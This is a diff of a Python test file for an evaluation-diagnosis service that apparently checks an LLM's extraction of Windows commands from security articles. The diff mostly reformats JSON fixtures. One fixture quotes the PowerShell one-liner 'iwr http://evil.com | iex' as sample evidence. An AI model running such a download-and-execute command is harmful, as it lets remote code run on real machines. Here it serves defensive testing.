@@ -1,7 +1,6 @@
 """Tests for EvalDiagnosisService."""
 
 import json
-from pathlib import Path
 from unittest.mock import AsyncMock, Mock, patch
 
 import pytest
@@ -22,28 +21,28 @@ def _make_llm_response(content: str) -> dict:
 
 def _sample_diagnosis_json() -> str:
     """Return a valid diagnosis JSON string."""
-    return json.dumps({
-        "summary": "Extractor missed 3 commands because the prompt does not cover PowerShell aliases.",
-        "failure_category": "prompt_gap",
-        "confidence": 0.82,
-        "root_causes": [
-            {
-                "cause": "PowerShell aliases (iwr, iex) not covered by extraction rules",
-                "evidence": "Article contains 'iwr http://evil.com | iex' but output omits it",
-                "severity": "high",
-            }
-        ],
-        "recommendations": [
-            {
-                "action": "Add PowerShell alias expansion note to SCOPE section",
-                "rationale": "Common in-the-wild pattern not currently addressed",
-                "priority": 1,
-            }
-        ],
-        "contract_violations": [
-            "SCOPE: Extract all single-line Windows commands with arguments"
-        ],
-    })
+    return json.dumps(
+        {
+            "summary": "Extractor missed 3 commands because the prompt does not cover PowerShell aliases.",
+            "failure_category": "prompt_gap",
+            "confidence": 0.82,
+            "root_causes": [
+                {
+                    "cause": "PowerShell aliases (iwr, iex) not covered by extraction rules",
+                    "evidence": "Article contains 'iwr http://evil.com | iex' but output omits it",
+                    "severity": "high",
+                }
+            ],
+            "recommendations": [
+                {
+                    "action": "Add PowerShell alias expansion note to SCOPE section",
+                    "rationale": "Common in-the-wild pattern not currently addressed",
+                    "priority": 1,
+                }
+            ],
+            "contract_violations": ["SCOPE: Extract all single-line Windows commands with arguments"],
+        }
+    )
 
 
 def _sample_bundle() -> dict:
@@ -212,11 +211,13 @@ class TestParseDiagnosisResponse:
         """JSON missing some fields still returns what it can."""
         llm_service = Mock()
         service = EvalDiagnosisService(llm_service)
-        partial = json.dumps({
-            "summary": "Partial result",
-            "failure_category": "input_noise",
-            "confidence": 0.5,
-        })
+        partial = json.dumps(
+            {
+                "summary": "Partial result",
+                "failure_category": "input_noise",
+                "confidence": 0.5,
+            }
+        )
         result = service._parse_diagnosis_response(partial)
 
         assert result["summary"] == "Partial result"
@@ -232,9 +233,7 @@ class TestDiagnoseBundle:
     async def test_diagnose_returns_structured_result(self):
         """Full diagnosis flow returns expected envelope structure."""
         llm_service = Mock()
-        llm_service.request_chat = AsyncMock(
-            return_value=_make_llm_response(_sample_diagnosis_json())
-        )
+        llm_service.request_chat = AsyncMock(return_value=_make_llm_response(_sample_diagnosis_json()))
         service = EvalDiagnosisService(llm_service)
         bundle = _sample_bundle()
 
@@ -264,9 +263,7 @@ class TestDiagnoseBundle:
     async def test_diagnose_calls_request_chat_correctly(self):
         """Verify the LLM call is made with correct provider and parameters."""
         llm_service = Mock()
-        llm_service.request_chat = AsyncMock(
-            return_value=_make_llm_response(_sample_diagnosis_json())
-        )
+        llm_service.request_chat = AsyncMock(return_value=_make_llm_response(_sample_diagnosis_json()))
         service = EvalDiagnosisService(llm_service)
         bundle = _sample_bundle()
 
@@ -307,9 +304,7 @@ class TestSaveDiagnosis:
             "contract_violations": [],
         }
 
-        with patch(
-            "src.services.eval_diagnosis_service.DIAGNOSES_DIR", tmp_path
-        ):
+        with patch("src.services.eval_diagnosis_service.DIAGNOSES_DIR", tmp_path):
             filepath = service.save_diagnosis(diagnosis)
 
         assert filepath.exists()
